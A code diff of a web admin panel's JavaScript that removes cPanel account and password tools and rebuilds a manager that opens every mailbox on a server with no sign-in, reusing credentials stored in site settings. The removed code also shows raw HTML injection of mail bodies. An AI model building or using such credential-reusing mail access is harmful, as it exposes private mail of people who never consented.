-      sel.innerHTML=d.plans.map(p=>`<option value="${esc(p.name)}">${esc(p.name)}${p.quota?' (disk: '+esc(p.quota)+' MB)':''}</option>`).join('');
-    } else sel.innerHTML='<option value="default">default</option>';
-  }catch{sel.innerHTML='<option value="default">default</option>';}
-}
-document.getElementById('cpanelCreateClose')?.addEventListener('click',()=>closeMod('cpanelCreateOv'));
-document.getElementById('cpanelCreateApply')?.addEventListener('click',async()=>{
-  const user=document.getElementById('cpNewUser').value.trim();
-  const domain=document.getElementById('cpNewDomain').value.trim();
-  const pass=document.getElementById('cpNewPass').value;
-  const email=document.getElementById('cpNewEmail').value.trim();
-  const plan=document.getElementById('cpNewPlan').value||'default';
-  const fb=document.getElementById('cpanelCreateFeedback');
-  if(!user||!domain||pass.length<8){fb.innerHTML='<div style="color:#fca5a5;margin-bottom:10px;font-size:12px">Username, domain, and a password of at least 8 characters are required.</div>';return;}
-  const btn=document.getElementById('cpanelCreateApply');btn.disabled=true;btn.textContent='Creating…';
-  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','cpanel_create');
-  fd.append('cp_new_user',user);fd.append('cp_new_domain',domain);fd.append('cp_new_pass',pass);
-  fd.append('cp_new_email',email);fd.append('cp_new_plan',plan);
-  await fetch('',{method:'POST',body:fd});
-  btn.disabled=false;btn.textContent='Create Account';
-  closeMod('cpanelCreateOv');
-  toast('Account created! Refreshing list…');
-  loadCpAccounts();
-});
-
-/* ── Change Password modal ── */
-document.getElementById('cpanelPassClose')?.addEventListener('click',()=>closeMod('cpanelPassOv'));
-document.getElementById('cpanelPassApply')?.addEventListener('click',async()=>{
-  const target=document.getElementById('cpPassTargetUser').value;
-  const pass=document.getElementById('cpPassNew').value;
-  const fb=document.getElementById('cpanelPassFeedback');
-  if(pass.length<8){fb.innerHTML='<div style="color:#fca5a5;margin-bottom:10px;font-size:12px">Password must be at least 8 characters.</div>';return;}
-  const btn=document.getElementById('cpanelPassApply');btn.disabled=true;btn.textContent='Changing…';
-  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','cpanel_change_pass');
-  fd.append('cp_target_user',target);fd.append('cp_target_pass',pass);
-  await fetch('',{method:'POST',body:fd});
-  btn.disabled=false;btn.textContent='Change Password';
-  closeMod('cpanelPassOv');
-  toast(`Password for "${target}" changed.`);
-});
-
-})(); // end cPanel Manager IIFE
 
 /* ═══════════════════════════════════════
    WEBMAIL MANAGER
+   Every mailbox the host holds — Maildir, mbox, IMAP, POP3, the mail account
+   a site's own settings name, and the cPanel accounts — listed in one place
+   and opened by a click, with nothing typed in. The window is built in the
+   order the work happens: choose a mailbox, choose a folder, choose a
+   message, read it; writing is one button away from wherever the reading is.
 ═══════════════════════════════════════ */
 (function(){
-let wmCurrentMailbox=null,wmCurrentFolder='INBOX',wmMailboxes=[];
+'use strict';
 
-document.getElementById('webmailBtn')?.addEventListener('click',()=>{
-  openMod('webmailOv');
-  wmLoadMailboxes();
-});
-document.getElementById('webmailClose')?.addEventListener('click',()=>closeMod('webmailOv'));
+const KIND={
+  maildir:{t:'Mail folder',d:'one file per message on this server'},
+  mbox:{t:'Mail file',d:'an old-style single mail file'},
+  imap:{t:'Mail server',d:'read over IMAP with the sign-in the site holds'},
+  pop3:{t:'POP3',d:'read over POP3 with the sign-in the site holds'},
+  cpanel:{t:'cPanel account',d:'opened through cPanel\'s own webmail sign-on'},
+  site:{t:'Address only',d:'the site knows this address, but no mailbox for it is here'}
+};
+const S={accounts:[],notes:[],search:'',acc:null,can:{},folders:[],folder:'INBOX',
+         msgs:[],sel:new Set(),msg:null,view:'msg',msgFilter:'',busy:false,
+         attachments:[],compose:null};
 
-async function wmLoadMailboxes(){
-  const el=document.getElementById('wmMailboxList');
-  el.innerHTML='<div style="text-align:center;padding:24px;color:var(--t3);font-size:12px">Auto-detecting mailboxes…</div>';
+const q=(sel)=>document.querySelector(sel);
+const qa=(sel)=>Array.prototype.slice.call(document.querySelectorAll(sel));
+const el=(id)=>document.getElementById(id);
+const num=(n)=>String(n==null?0:n);
+const when=(ts)=>{
+  if(!ts)return '';
+  const d=new Date(ts*1000),now=new Date();
+  const same=d.toDateString()===now.toDateString();
+  const pad=(x)=>String(x).padStart(2,'0');
+  if(same)return pad(d.getHours())+':'+pad(d.getMinutes());
+  if(d.getFullYear()===now.getFullYear())return d.toLocaleDateString(undefined,{month:'short',day:'numeric'});
+  return d.toLocaleDateString(undefined,{year:'numeric',month:'short',day:'numeric'});
+};
+const size=(b)=>{
+  b=Number(b)||0;
+  if(b<1024)return b+' B';
+  if(b<1048576)return (b/1024).toFixed(b<10240?1:0)+' KB';
+  return (b/1048576).toFixed(1)+' MB';
+};
+
+/* ── talking to the server ─────────────────────────────────────────────── */
+async function api(action,fields){
+  const fd=new FormData();
+  fd.append('csrf_token',CSRF);
+  fd.append('action',action);
+  Object.keys(fields||{}).forEach(k=>{
+    const v=fields[k];
+    if(v!==undefined&&v!==null)fd.append(k,v);
+  });
+  let d={ok:false,error:'The server answered nothing.'};
   try{
-    const d=await fetch('?x=webmail_mailboxes').then(r=>r.json());
-    if(!d.ok){
-      const diagHtml=(d.diagnostics&&d.diagnostics.length)?`<div style="text-align:left;max-width:380px;margin:12px auto 0;background:var(--raised);border:1px solid var(--b2);border-radius:8px;padding:10px 12px">
-        <div style="font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:var(--t3);margin-bottom:6px">Why detection failed</div>
-        ${d.diagnostics.map(x=>`<div style="font-size:11px;color:var(--t3);line-height:1.6;padding:3px 0;border-top:1px dashed var(--b2)">• ${esc(x)}</div>`).join('')}
-      </div>`:'';
-      el.innerHTML=`<div style="padding:16px;text-align:center;color:#fca5a5;font-size:12px">${esc('No mail server could be auto-detected on this host.')}</div>${diagHtml}`;
-      return;
-    }
-    wmMailboxes=d.mailboxes||[];
-    if(!wmMailboxes.length){el.innerHTML='<div style="padding:16px;color:var(--t3);font-size:12px">No mailboxes found.</div>';return;}
-    const modeLabel={sandbox:'Sandbox',cpanel_api:'cPanel API',doveadm:'Dovecot',real:'Detected'}[d.mode]||'Detected';
-    el.innerHTML=`<div style="padding:8px 12px;font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:var(--t3)">${esc(modeLabel)} mailboxes</div>`+
-      wmMailboxes.map(m=>`<button class="sb-item wm-mbx-btn" data-mbx="${esc(m.email)}" style="width:100%;text-align:left;padding:9px 12px;font-size:12.5px;border-radius:0"><svg viewBox="0 0 24 24" style="width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;margin-right:6px;vertical-align:-2px"><rect x="3" y="5" width="18" height="14" rx="2"/><polyline points="3 7 12 13 21 7"/></svg>${esc(m.email)}</button>`).join('');
-    el.querySelectorAll('.wm-mbx-btn').forEach(b=>b.addEventListener('click',()=>{
-      el.querySelectorAll('.wm-mbx-btn').forEach(x=>x.classList.remove('active'));
-      b.classList.add('active');
-      wmOpenMailbox(b.dataset.mbx);
-    }));
-    // Populate compose "From" select too
-    const fromSel=document.getElementById('wmFrom');
-    fromSel.innerHTML=wmMailboxes.map(m=>`<option value="${esc(m.email)}">${esc(m.email)}</option>`).join('');
-  }catch(e){el.innerHTML=`<div style="padding:16px;color:#fca5a5;font-size:12px">Failed: ${esc(String(e))}</div>`;}
+    const r=await fetch('?x=mail',{method:'POST',body:fd,cache:'no-store',credentials:'same-origin'});
+    const txt=await r.text();
+    try{d=JSON.parse(txt);}catch(e){d={ok:false,error:r.status===403?'This account is not allowed to use the Webmail Manager.':'The server sent an answer this window cannot read.'};}
+    if(r.status===403)d={ok:false,error:'This account is not allowed to use the Webmail Manager. Ask the administrator for the CMS permission.'};
+  }catch(e){d={ok:false,error:'The manager could not be reached: '+e.message};}
+  return d;
+}
+function flash(kind,text){
+  const box=el('wmStatus');
+  if(!box)return;
+  box.className='wm-status '+(kind||'');
+  box.textContent=text||'';
+  if(kind==='good'||kind==='bad'){
+    clearTimeout(flash._t);
+    flash._t=setTimeout(()=>{if(box.textContent===text)box.textContent='';},9000);
+  }
+}
+function download(url){
+  if(!url)return;
+  const a=document.createElement('a');
+  a.href=url;a.rel='noopener';a.download='';
+  document.body.appendChild(a);a.click();a.remove();
 }
 
-async function wmOpenMailbox(mailbox){
-  wmCurrentMailbox=mailbox;wmCurrentFolder='INBOX';
-  document.getElementById('wmMsgView').innerHTML='<div style="text-align:center;padding:40px;color:var(--t3);font-size:12px">Select a message to read it</div>';
-  const fEl=document.getElementById('wmFolderList');
-  fEl.innerHTML='<div style="padding:10px 12px;color:var(--t3);font-size:11.5px">Loading folders…</div>';
-  try{
-    const d=await fetch('?x=webmail_folders&mailbox='+encodeURIComponent(mailbox)).then(r=>r.json());
-    const folders=d.ok?(d.folders||['INBOX']):['INBOX'];
-    fEl.innerHTML=folders.map(f=>`<button class="wm-folder-btn" data-f="${esc(f)}" style="display:block;width:100%;text-align:left;padding:7px 12px;border:none;background:${f===wmCurrentFolder?'var(--raised)':'none'};color:var(--t2);font-size:11.5px;cursor:pointer;font-family:inherit">${esc(f)}</button>`).join('');
-    fEl.querySelectorAll('.wm-folder-btn').forEach(b=>b.addEventListener('click',()=>{
-      fEl.querySelectorAll('.wm-folder-btn').forEach(x=>x.style.background='none');
-      b.style.background='var(--raised)';
-      wmCurrentFolder=b.dataset.f;
-      wmLoadMessages();
-    }));
-  }catch(e){fEl.innerHTML='';}
-  wmLoadMessages();
-}
-
-async function wmLoadMessages(){
-  const el=document.getElementById('wmMsgList');
-  el.innerHTML='<div style="text-align:center;padding:24px;color:var(--t3);font-size:12px">Loading…</div>';
-  try{
-    const d=await fetch('?x=webmail_messages&mailbox='+encodeURIComponent(wmCurrentMailbox)+'&folder='+encodeURIComponent(wmCurrentFolder)).then(r=>r.json());
-    if(!d.ok){el.innerHTML=`<div style="padding:16px;color:#fca5a5;font-size:12px">${esc(d.error||'Failed to load messages.')}</div>`;return;}
-    const msgs=d.messages||[];
-    if(!msgs.length){el.innerHTML='<div style="padding:24px;text-align:center;color:var(--t3);font-size:12px">This folder is empty.</div>';return;}
-     el.innerHTML=msgs.map(m=>`<div class="wm-msg-row" data-uid="${m.uid}" style="padding:10px 12px;border-bottom:1px solid var(--b2);cursor:pointer;${m.seen?'':'background:rgba(133,137,140,.06)'}">
-        <div style="display:flex;justify-content:space-between;gap:6px"><span style="font-size:12px;font-weight:${m.seen?'500':'700'};color:var(--t2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:150px">${esc(m.from||'Unknown')}</span>${m.flagged?`<span style="color:#f59e0b">${fmSvgIcon('star',12)}</span>`:''}</div>
-        <div style="font-size:12px;color:var(--t2);margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(m.subject||'(No subject)')}</div>
-        <div style="font-size:10.5px;color:var(--t3);margin-top:2px">${esc(m.date||'')}</div>
-      </div>`).join('');
-    el.querySelectorAll('.wm-msg-row').forEach(r=>r.addEventListener('click',()=>{
-      el.querySelectorAll('.wm-msg-row').forEach(x=>x.style.outline='none');
-       r.style.outline='2px solid #85898C';
-      wmOpenMessage(r.dataset.uid);
-    }));
-  }catch(e){el.innerHTML=`<div style="padding:16px;color:#fca5a5;font-size:12px">Failed: ${esc(String(e))}</div>`;}
-}
-
-async function wmOpenMessage(uid){
-  const el=document.getElementById('wmMsgView');
-  el.innerHTML='<div style="text-align:center;padding:40px;color:var(--t3);font-size:12px">Loading…</div>';
-  try{
-    const d=await fetch('?x=webmail_message&mailbox='+encodeURIComponent(wmCurrentMailbox)+'&folder='+encodeURIComponent(wmCurrentFolder)+'&uid='+encodeURIComponent(uid)).then(r=>r.json());
-    if(!d.ok){el.innerHTML=`<div style="padding:16px;color:#fca5a5;font-size:12px">${esc(d.error||'Failed to load message.')}</div>`;return;}
-     const atts=(d.attachments||[]).map(a=>`<a href="?x=webmail_attachment&mailbox=${encodeURIComponent(wmCurrentMailbox)}&folder=${encodeURIComponent(wmCurrentFolder)}&uid=${encodeURIComponent(uid)}&part=${encodeURIComponent(a.part)}&name=${encodeURIComponent(a.name)}" class="btn btn-xs btn-g" style="margin-right:6px;margin-top:6px;display:inline-flex;align-items:center;gap:5px"><svg aria-hidden="true" viewBox="0 0 24 24" style="width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0"><path d="m21.4 11.1-9.2 9.2a6 6 0 0 1-8.5-8.5l9.9-9.9a4 4 0 0 1 5.7 5.7l-9.9 9.9a2 2 0 0 1-2.8-2.8l9.2-9.2"/></svg>${esc(a.name)} (${formatBytes(a.size||0)})</a>`).join('');
-    el.innerHTML=`
-      <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:14px;gap:10px">
-        <div>
-          <div style="font-size:16px;font-weight:700;color:var(--t1);margin-bottom:6px">${esc(d.subject||'(No subject)')}</div>
-          <div style="font-size:12px;color:var(--t3)">From: <strong style="color:var(--t2)">${esc(d.from||'')}</strong></div>
-          <div style="font-size:12px;color:var(--t3)">To: ${esc(d.to||'')}</div>
-          <div style="font-size:11px;color:var(--t3);margin-top:2px">${esc(d.date||'')}</div>
-        </div>
-        <div style="display:flex;gap:6px;flex-shrink:0">
-          <button class="btn btn-xs btn-g" id="wmFlagBtn">${fmSvgIcon('star',12)} Flag</button>
-          <button class="btn btn-xs btn-red" id="wmDelBtn">Delete</button>
-        </div>
-      </div>
-      ${atts?`<div style="margin-bottom:12px">${atts}</div>`:''}
-      <div style="border-top:1px solid var(--b2);padding-top:14px;font-size:13px;line-height:1.6;color:var(--t2);word-break:break-word">${d.is_html?d.body:d.body}</div>`;
-    document.getElementById('wmFlagBtn')?.addEventListener('click',async()=>{
-      const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','webmail_mark');
-      fd.append('wm_mailbox',wmCurrentMailbox);fd.append('wm_folder',wmCurrentFolder);fd.append('wm_uid',uid);
-      fd.append('wm_flag','flagged');fd.append('wm_set','1');
-      await fetch('',{method:'POST',body:fd});
-      toast('Message flagged.');wmLoadMessages();
+/* ── the rail: every mailbox, grouped by where it was found ─────────────── */
+function renderRail(){
+  const box=el('wmList');
+  if(!box)return;
+  const term=S.search.trim().toLowerCase();
+  const groups=[
+    {key:'This server',note:'mail that is physically on this machine'},
+    {key:'The sites',note:'mail servers and addresses the sites themselves name'},
+    {key:'',note:'addresses known to the sites, with no mailbox here'}
+  ];
+  let html='';
+  groups.forEach(g=>{
+    const rows=S.accounts.filter(a=>{
+      if((a.group||'')!==g.key)return false;
+      if(!term)return true;
+      return (a.email+' '+(a.origin||'')+' '+(a.name||'')).toLowerCase().indexOf(term)>=0;
     });
-    document.getElementById('wmDelBtn')?.addEventListener('click',async()=>{
-      if(!confirm('Delete this message permanently?'))return;
-      const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','webmail_delete');
-      fd.append('wm_mailbox',wmCurrentMailbox);fd.append('wm_folder',wmCurrentFolder);fd.append('wm_uid',uid);
-      await fetch('',{method:'POST',body:fd});
-      toast('Message deleted.');
-      el.innerHTML='<div style="text-align:center;padding:40px;color:var(--t3);font-size:12px">Select a message to read it</div>';
-      wmLoadMessages();
+    if(!rows.length)return;
+    html+='<div class="wm-group"><span>'+esc(g.key||'Addresses')+'</span><i>'+esc(g.note)+'</i></div>';
+    rows.forEach(a=>{
+      const can=a.can&&a.can.read;
+      const selected=S.acc&&S.acc.id===a.id;
+      html+='<button type="button" class="wm-item'+(selected?' is-on':'')+(can?'':' wm-item-off')+'" data-id="'+esc(a.id)+'" title="'+esc((a.origin||'')+(a.where?' · '+a.where:''))+'">'
+        +'<span class="wm-dot'+(can?'':' off')+'"></span>'
+        +'<span class="t"><b>'+esc(a.email)+'</b><span>'+esc((KIND[a.kind]||{t:a.kind}).t)+(a.name&&a.name!==a.email?' · '+esc(a.name):'')+'</span></span>'
+        +'</button>';
     });
-    wmLoadMessages(); // refresh seen state in list without losing selection styling
-  }catch(e){el.innerHTML=`<div style="padding:16px;color:#fca5a5;font-size:12px">Failed: ${esc(String(e))}</div>`;}
+  });
+  if(!html)html='<div class="wm-empty">'+(term?'No mailbox matches that.':'No mailbox was found on this server.')+'</div>';
+  box.innerHTML=html;
+  qa('#wmList .wm-item').forEach(b=>b.addEventListener('click',()=>{
+    const a=S.accounts.filter(x=>x.id===b.dataset.id)[0];
+    if(a)openMailbox(a);
+  }));
+}
+function renderNotes(data){
+  const box=el('wmFoot');
+  if(!box)return;
+  const parts=[];
+  parts.push('<div class="wm-foot-line"><b>'+num(S.accounts.filter(a=>a.can&&a.can.read).length)+'</b> readable · <b>'+num(S.accounts.length)+'</b> found</div>');
+  (S.notes||[]).forEach(n=>parts.push('<div class="wm-foot-note">'+esc(n)+'</div>'));
+  if(data&&data.scanned&&data.scanned.length)parts.push('<div class="wm-foot-note">Looked in '+data.scanned.map(esc).join(', ')+'</div>');
+  box.innerHTML=parts.join('');
 }
 
-/* ── Compose ── */
-document.getElementById('wmComposeBtn')?.addEventListener('click',()=>{
-  document.getElementById('wmTo').value='';document.getElementById('wmSubject').value='';
-  document.getElementById('wmBody').value='';document.getElementById('wmComposeFeedback').innerHTML='';
-  if(wmCurrentMailbox)document.getElementById('wmFrom').value=wmCurrentMailbox;
-  openMod('webmailComposeOv');
-});
-document.getElementById('wmComposeClose')?.addEventListener('click',()=>closeMod('webmailComposeOv'));
-document.getElementById('wmSendBtn')?.addEventListener('click',async()=>{
-  const from=document.getElementById('wmFrom').value;
-  const to=document.getElementById('wmTo').value.trim();
-  const subject=document.getElementById('wmSubject').value.trim()||'(No subject)';
-  const body=document.getElementById('wmBody').value;
-  const fb=document.getElementById('wmComposeFeedback');
-  if(!to){fb.innerHTML='<div style="color:#fca5a5;margin-bottom:10px;font-size:12px">A recipient is required.</div>';return;}
-  const btn=document.getElementById('wmSendBtn');btn.disabled=true;btn.textContent='Sending…';
-  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','webmail_send');
-  fd.append('wm_from',from);fd.append('wm_to',to);fd.append('wm_subject',subject);fd.append('wm_body',body);
-  let result=null;
-  try{
-    const response=await fetch('',{method:'POST',body:fd});
-    const text=await response.text();
-    // POST actions normally redirect, but JSON is supported by the endpoint
-    // when a hosting layer returns it directly.
-    try{result=JSON.parse(text);}catch(_){}
-    if(!response.ok)throw new Error('HTTP '+response.status);
-  }catch(e){
-    btn.disabled=false;btn.textContent='Send';
-    fb.innerHTML=`<div style="color:#fca5a5;margin-bottom:10px;font-size:12px">Send failed: ${esc(String(e))}</div>`;
+/* ── one mailbox, opened as soon as it is picked ────────────────────────── */
+async function openMailbox(a){
+  S.acc=a;S.can=a.can||{};S.folders=[];S.msgs=[];S.sel=new Set();S.msg=null;S.msgFilter='';S.folder='INBOX';
+  renderRail();
+  renderHead();
+  el('wmFolders').innerHTML='';
+  el('wmMsgs').innerHTML='<div class="wm-empty">Opening '+esc(a.email)+'…</div>';
+  renderRead(null);
+  const d=await api('folders',{account:a.id});
+  S.can=d.can||S.can;
+  S.folders=d.folders||[];
+  renderHead();
+  renderFolders();
+  const first=S.folders.filter(f=>f.id==='INBOX')[0]||S.folders[0];
+  if(!first){
+    el('wmMsgs').innerHTML='<div class="wm-empty">'+esc(d.why||(S.can.why||'This mailbox has no folder to open.'))+'</div>';
+    return false;
+  }
+  await selectFolder(first.id);
+  return true;
+}
+function renderHead(){
+  const a=S.acc;
+  const box=el('wmHeadMain');
+  if(!box)return;
+  if(!a){box.innerHTML='<div class="wm-head-idle">Pick a mailbox on the left. It opens by itself — nothing to sign in to.</div>';return;}
+  const can=S.can||{};
+  const chips=[];
+  chips.push('<span class="pma-chip acc">'+esc((KIND[a.kind]||{t:a.kind}).t)+'</span>');
+  chips.push(can.read?'<span class="pma-chip ok">read</span>':'<span class="pma-chip bad">not readable here</span>');
+  if(can.delete)chips.push('<span class="pma-chip ok">delete</span>');
+  if(can.send)chips.push('<span class="pma-chip ok">send</span>');
+  if(a.site&&a.site.label)chips.push('<span class="pma-chip">'+esc(a.site.label)+'</span>');
+  box.innerHTML='<div class="wm-head-row"><div class="wm-head-id"><b>'+esc(a.email)+'</b>'
+    +'<span>'+esc(a.origin||'')+(a.where?' · '+esc(a.where):'')+'</span></div>'
+    +'<div class="pma-chips">'+chips.join('')+'</div></div>';
+}
+function renderFolders(){
+  const box=el('wmFolders');
+  if(!box)return;
+  if(!S.folders.length){box.innerHTML='';return;}
+  box.innerHTML=S.folders.map(f=>{
+    const on=f.id===S.folder;
+    return '<button type="button" class="wm-folder'+(on?' is-on':'')+'" data-f="'+esc(f.id)+'">'
+      +esc(f.name)+(f.count?'<i>'+num(f.count)+'</i>':'')
+      +(f.unread?'<u>'+num(f.unread)+' new</u>':'')
+      +'</button>';
+  }).join('');
+  qa('#wmFolders .wm-folder').forEach(b=>b.addEventListener('click',()=>selectFolder(b.dataset.f)));
+}
+async function selectFolder(id){
+  S.folder=id;S.sel=new Set();S.msg=null;S.msgFilter='';
+  renderFolders();renderRead(null);
+  const f=S.folders.filter(x=>x.id===id)[0];
+  el('wmMsgsTitle').textContent=(f?f.name:id);
+  el('wmMsgs').innerHTML='<div class="wm-empty">Reading '+esc(f?f.name:id)+'…</div>';
+  const d=await api('messages',{account:S.acc.id,folder:id});
+  S.msgs=d.messages||[];
+  if(d.can)S.can=d.can;
+  S.dlBase=d.download_all||'';
+  renderMsgs();
+  renderBulk();
+}
+function renderMsgs(){
+  const box=el('wmMsgs');
+  if(!box)return;
+  const term=S.msgFilter.trim().toLowerCase();
+  const rows=S.msgs.filter(m=>!term||((m.subject+' '+m.from+' '+m.from_email+' '+m.to)||'').toLowerCase().indexOf(term)>=0);
+  if(!rows.length){
+    box.innerHTML='<div class="wm-empty">'+(S.msgs.length?'Nothing matches that.':'This folder is empty.')+'</div>';
     return;
   }
-  btn.disabled=false;btn.textContent='Send';
-  closeMod('webmailComposeOv');
-  toast(result&&result.ok===false?(result.error||'Message was not sent.'):'Message sent.');
-  if(wmCurrentMailbox===from)wmLoadMessages();
-});
+  box.innerHTML=rows.map(m=>{
+    const on=S.msg&&S.msg.uid===m.uid;
+    return '<div class="wm-row'+(on?' is-on':'')+(m.seen?'':' unread')+'" data-uid="'+esc(m.uid)+'">'
+      +'<label class="wm-check"><input type="checkbox" data-sel="'+esc(m.uid)+'"'+(S.sel.has(m.uid)?' checked':'')+'></label>'
+      +'<div class="wm-row-main">'
+      +'<div class="wm-row-top"><b>'+esc(m.from||m.from_email||'(unknown)')+'</b><span>'+esc(when(m.date))+'</span></div>'
+      +'<div class="wm-row-sub">'+esc(m.subject||'(no subject)')+'</div>'
+      +'<div class="wm-row-end"><span>'+esc(size(m.size))+'</span>'
+      +(m.attachments?'<svg viewBox="0 0 24 24" class="wm-clip"><path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"/></svg>':'')
+      +'</div></div></div>';
+  }).join('');
+  qa('#wmMsgs .wm-row').forEach(r=>{
+    r.addEventListener('click',(ev)=>{
+      if(ev.target.closest('.wm-check'))return;
+      openMessage(r.dataset.uid);
+    });
+    const cb=r.querySelector('input[data-sel]');
+    if(cb)cb.addEventListener('change',()=>{
+      if(cb.checked)S.sel.add(cb.dataset.sel);else S.sel.delete(cb.dataset.sel);
+      renderBulk();
+    });
+  });
+}
+function renderBulk(){
+  const box=el('wmBulk');
+  if(!box)return;
+  const canDelete=S.can&&S.can.delete;
+  box.innerHTML='<label class="wm-check wm-check-all"><input type="checkbox" id="wmSelAll"'+(S.sel.size&&S.sel.size===S.msgs.length?' checked':'')+'></label>'
+    +'<span class="wm-bulk-n">'+num(S.sel.size)+' selected</span>'
+    +'<button type="button" class="btn btn-xs btn-g" id="wmDeleteSel"'+(canDelete?'':' disabled title="'+esc(S.can.why||'This mailbox cannot delete messages.')+'"')+'>'
+    +'<svg viewBox="0 0 24 24"><path d="M3 6h18"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4h6v2"/></svg>Delete</button>'
+    +'<button type="button" class="btn btn-xs btn-g" id="wmDownloadSel"'+((S.sel.size)||S.dlBase?'':' disabled')+'>'
+    +'<svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download</button>';
+  const all=el('wmSelAll');
+  if(all)all.addEventListener('change',()=>{
+    S.sel=new Set();
+    if(all.checked)S.msgs.forEach(m=>S.sel.add(m.uid));
+    /* tick the rows that are already drawn — rebuilding the whole list on a
+       single click throws away the scroll position and every open row */
+    qa('#wmMsgs input[data-sel]').forEach(cb=>{cb.checked=all.checked;});
+    renderBulk();
+  });
+  const del=el('wmDeleteSel');
+  if(del)del.addEventListener('click',deleteSelected);
+  const dl=el('wmDownloadSel');
+  if(dl)dl.addEventListener('click',()=>{
+    if(S.sel.size){
+      const chosen=S.msgs.filter(m=>S.sel.has(m.uid));
+      chosen.forEach(m=>download(S.dlBase+'&uid='+encodeURIComponent(m.uid)+'&what=eml'));
+      flash('good','Downloading '+chosen.length+' message'+(chosen.length===1?'':'s')+'.');
+    }else if(S.dlBase){
+      download(S.dlBase+'&what=all');
+      flash('good','Downloading the whole folder as one mail file.');
+    }
+  });
+}
+async function deleteSelected(){
+  if(!S.sel.size)return;
+  const uids=Array.from(S.sel);
+  if(!confirm('Delete '+uids.length+' message'+(uids.length===1?'':'s')+'? They go to Trash when the mailbox has one.'))return;
+  flash('','Deleting…');
+  const d=await api('delete',{account:S.acc.id,folder:S.folder,uids:JSON.stringify(uids)});
+  if(!d.ok){flash('bad',d.error||'They could not be deleted.');return;}
+  flash('good','Deleted '+num(d.deleted)+' message'+(d.deleted===1?'':'s')+(d.moved?' (moved to '+d.moved+')':'')+'.');
+  S.sel=new Set();
+  if(S.msg&&uids.indexOf(S.msg.uid)>=0){S.msg=null;renderRead(null);}
+  /* the list is corrected at once, and read again from the mailbox in the
+     background, so the window never lags behind the click */
+  S.msgs=S.msgs.filter(m=>uids.indexOf(m.uid)<0);
+  renderMsgs();renderBulk();
+  refreshFolder();
+}
+async function refreshFolder(){
+  const d=await api('messages',{account:S.acc.id,folder:S.folder});
+  S.msgs=d.messages||[];S.dlBase=d.download_all||'';
+  renderMsgs();renderBulk();
+  const f=await api('folders',{account:S.acc.id});
+  if(f.ok&&f.folders)S.folders=f.folders;
+  renderFolders();
+}
 
+/* ── reading one message ────────────────────────────────────────────────── */
+async function openMessage(uid){
+  el('wmRead').innerHTML='<div class="wm-empty">Opening the message…</div>';
+  const d=await api('message',{account:S.acc.id,folder:S.folder,uid:uid});
+  if(!d.ok){el('wmRead').innerHTML='<div class="wm-empty bad">'+esc(d.error||'That message could not be read.')+'</div>';return;}
+  S.msg=d.message;S.view='msg';
+  const row=S.msgs.filter(m=>m.uid===uid)[0];
+  if(row&&!row.seen){row.seen=true;renderMsgs();}
+  renderRead();
+}
+function renderRead(){
+  const box=el('wmRead');
+  if(!box)return;
+  const m=S.msg;
+  if(!m){
+    box.innerHTML='<div class="wm-read-idle"><svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22 6 12 13 2 6"/></svg>'
+      +'<b>No message open</b><span>Pick one on the left and it opens here, formatted as it was sent.</span></div>';
+    return;
+  }
+  const can={...S.can};
+  const tabs=[['msg','Message'],['text','Plain text'],['info','Details']];
+  const tabHtml=tabs.map(t=>'<button type="button" class="wm-tab'+(S.view===t[0]?' is-on':'')+'" data-view="'+t[0]+'">'+t[1]+'</button>').join('');
+  let bodyHtml='';
+  if(S.view==='msg'){
+    if(m.html&&m.html.trim()!=='')bodyHtml='<iframe class="wm-frame" id="wmFrame" sandbox="allow-same-origin" referrerpolicy="no-referrer" title="Message"></iframe>';
+    else bodyHtml='<pre class="wm-pre">'+esc(m.plain||'(This message has no readable body.)')+'</pre>';
+  }else if(S.view==='text'){
+    bodyHtml='<pre class="wm-pre">'+esc(m.plain||'(There is no plain-text part.)')+'</pre>';
+  }else{
+    bodyHtml='<div class="wm-info">'
+      +'<div class="pma-line"><span class="k">From</span><span class="v">'+esc(m.from||'')+' &lt;'+esc(m.from_email||'')+'&gt;</span></div>'
+      +'<div class="pma-line"><span class="k">To</span><span class="v">'+esc(m.to_text||'')+'</span></div>'
+      +'<div class="pma-line"><span class="k">Cc</span><span class="v">'+esc(m.cc_text||'—')+'</span></div>'
+      +'<div class="pma-line"><span class="k">Date</span><span class="v">'+esc(m.date_text||'')+'</span></div>'
+      +'<div class="pma-line"><span class="k">Message-ID</span><span class="v mono">'+esc(m.message_id||'—')+'</span></div>'
+      +'<div class="pma-line"><span class="k">Reply-To</span><span class="v mono">'+esc(m.reply_to||'—')+'</span></div>'
+      +'</div>';
+  }
+  const atts=(m.attachments||[]).map(a=>'<a class="wm-att" href="'+esc(a.url||'#')+'" download><svg viewBox="0 0 24 24"><path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"/></svg>'
+    +'<span>'+esc(a.name)+'</span><i>'+esc(size(a.size))+'</i></a>').join('');
+  box.innerHTML='<div class="wm-read-head">'
+    +'<div class="wm-read-subject">'+esc(m.subject||'(no subject)')+'</div>'
+    +'<div class="wm-read-meta"><b>'+esc(m.from||m.from_email)+'</b><span>'+esc(m.from_email)+'</span></div>'
